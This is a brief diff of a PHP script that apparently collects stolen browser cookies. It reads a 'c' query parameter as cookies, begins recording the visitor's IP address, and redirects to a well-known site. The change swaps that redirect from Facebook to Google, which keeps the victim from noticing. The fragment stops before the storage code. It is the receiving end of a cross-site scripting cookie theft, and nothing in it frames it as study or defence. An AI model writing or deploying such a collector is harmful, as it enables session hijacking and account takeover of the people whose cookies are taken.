@@ -1,5 +1,5 @@
 <?php
-	header ('Location:https://www.facebook.com');
+	header ('Location:https://www.google.com');
 	$cookies = $_GET["c"];
 
 	if (!empty($_SERVER['HTTP_CLIENT_IP'])){
